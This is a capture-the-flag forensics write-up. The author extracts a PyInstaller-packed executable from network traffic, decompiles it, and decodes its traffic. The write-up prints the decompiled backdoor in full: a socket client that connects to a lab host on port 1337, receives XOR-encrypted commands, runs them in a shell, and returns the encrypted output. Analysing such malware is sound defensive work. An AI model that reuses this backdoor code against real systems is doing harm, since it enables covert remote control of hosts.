# Set up

For this cybersecurity challenge, I'll be using my Kali Linux VM. Everything will be done there, so no additional tools or machines are required.

# Goal

Analyze the provided network traffic, reverse engineer the suspicious executable, and find the answers hidden in the communication.

# Walkthrough

### Evidence

Download `evidence.zip` and compare its MD5 hash. It should be `ea6f0bf505f87d18c9881de055b63ed3`, which matches. Good, we can move on.

Unzip the archive, open the capture in Wireshark, and follow the HTTP stream. Save the transferred file, decode it using `base64 -d`, and save the result.

### Reverse engineering

Now, let's see what's inside. Use `strings -a` and look for anything interesting. One thing that caught my attention was `_MEIPASS2`.

A quick Google search revealed that it's associated with PyInstaller. That gives us a pretty good idea of what we're dealing with.

I used [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) to extract the executable, then installed `uncompyle6` using `pipx install uncompyle6` to decompile the Python bytecode.

Here's what we got:

```
import socket, base64, subprocess, sys
HOST = "10.0.2.64"
PORT = 1337

def xor_crypt(data, key):
    key_length = len(key)
    encrypted_data = []
    for i, byte in enumerate(data):
        encrypted_byte = byte ^ key[i % key_length]
        encrypted_data.append(encrypted_byte)
    else:
        return bytes(encrypted_data)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        received_data = s.recv(4096).decode("utf-8")
        encoded_image, encoded_command = received_data.split("AAAAAAAAAA")
        key = "???".encode("utf-8")
        decrypted_command = xor_crypt(base64.b64decode(encoded_command.encode("utf-8")), key)
        decrypted_command = decrypted_command.decode("utf-8")
        result = subprocess.check_output(decrypted_command, shell=True).decode("utf-8")
        encrypted_result = xor_crypt(result.encode("utf-8"), key)
        encrypted_result_base64 = base64.b64encode(encrypted_result).decode("utf-8")
        separator = "AAAAAAAAAA"
        send = encoded_image + separator + encrypted_result_base64
        s.sendall(send.encode("utf-8"))
```

So, the program connects to `10.0.2.64` on port `1337`, receives data, separates the image from the command, and decrypts the command using XOR. It then executes the command and sends the encrypted output back.

Looks like we'll need to investigate that communication more closely.

### Decoding the traffic

Back to Wireshark. Set the filter to `tcp.port == 1337`, follow the TCP stream, select the conversation involving the host and port we found earlier, and display the data as ASCII.

Next, head over to [CyberChef](https://cyberchef.org/) and decode the data.

We get a picture of milk, some green dude, and a Poké Ball. Quite a collection.

Judging by the Python code we found earlier, though, there should be hidden commands as well.

### Extracting the commands

I had to grab a Python script from one of the other write-ups to decode the traffic. The logic in the scripts I found was all over the place. They were searching between delimiters and PNG markers, and I'm pretty sure some of them would miss the last match because the messages don't necessarily end with PNG.

I tried three or four different scripts, and none of them worked correctly, so I grabbed the most working one and fixed it up myself.

Apparently, finding a working script was going to be more complicated than expected. At least I didn't have to write the XOR decryption myself.

### Finding the answers

Anyway, after rewriting the script, I continued through the TCP streams, decoded the messages, and found all the answers.

The key was connecting what we'd learned from reverse engineering the executable with the traffic captured in Wireshark. The pictures were just part of the story, the commands and their responses were what we needed to find.

# Last words

Overall it wasn't too complicated but finding out it was a packaged Python was crucial. I ended up trying to decompile it in Ghidra at one point, before I discovered that.

Cheers,  
Mikołaj.